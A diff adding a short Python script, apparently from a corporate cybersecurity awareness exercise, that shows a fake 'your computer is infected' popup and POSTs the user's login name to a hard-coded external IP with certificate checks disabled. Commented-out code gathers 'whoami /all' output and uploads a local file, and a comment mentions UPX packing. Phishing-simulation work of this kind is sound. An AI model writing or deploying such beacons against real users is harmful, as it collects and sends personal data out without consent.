@@ -1,0 +1,55 @@
+import sys
+
+import requests
+import os
+import subprocess
+import tkinter
+from tkinter import messagebox
+
+#упаковка в upx
+
+def get_user_info():
+    '''Функция собирает данные о текущем пользователе'''
+    #data = os.system('whoami /all')
+    data = subprocess.check_output('whoami /all', shell=True, text=True)
+    return data
+
+
+def show_popup_banner():
+    '''Функция показывает пользователю приветственный баннер'''
+    tkinter.messagebox.showerror(title='CYBERSEC DEPARTMENT ATTENTION', message='Инцидент кибербезопасности!\n'
+                                                                                'Вы устанавливаете вредоносное ПО из недоверенного источника!\n\n'
+                                                                                'Ваш компьютер заражен.')
+
+
+#Функция отправляет собранные данные на удаленный хост
+def data_send_to_remotehost():
+    url = 'https://46.29.160.63:80/'
+    file = {'file_field': ('local_file.txt', os.getlogin(), 'text/plain')}
+    try:
+        response = requests.post(url, files=file, verify=False, timeout=3)
+        print(response.text)
+    except Exception:
+        sys.exit()
+    # with open('C:/Users/msmandrykin/Desktop/cases/Cyber_Training_Q4_25/test.txt', 'r', encoding='utf-8') as file:
+    #     file = {'file_field': ('local_file.txt', file, 'text/plain')}
+    #     response = requests.post(url, files=file, verify=False)
+    #     print(response.text)
+
+
+
+#Функция создает на рабочем столе файл с пометкой о цифровой гигиене
+
+
+def file_create_userdata(data):
+    '''Функция создает файл с данными о пользователе'''
+    with open('data.txt', 'a') as file:
+        file.writelines(data)
+
+
+#data = get_user_info()
+#file_create_userdata(data)
+show_popup_banner()
+data_send_to_remotehost()
+sys.exit()
+
